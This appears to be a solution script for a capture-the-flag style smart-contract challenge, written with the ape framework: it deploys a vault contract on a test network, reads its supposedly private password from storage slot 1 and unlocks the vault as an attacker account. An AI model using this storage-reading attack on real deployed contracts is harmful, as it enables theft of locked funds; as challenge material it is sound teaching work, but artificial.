from scripts.deploy import deploy3
from ape import accounts, networks  # type: ignore


def solve():
    vault_contract = deploy3()
    attacker = accounts.test_accounts[1]

    password = networks.provider.get_storage(vault_contract.address, 1)

    assert vault_contract.locked() == True

    vault_contract.unlock(password, sender=attacker)

    assert vault_contract.locked() == False


def main():
    solve()
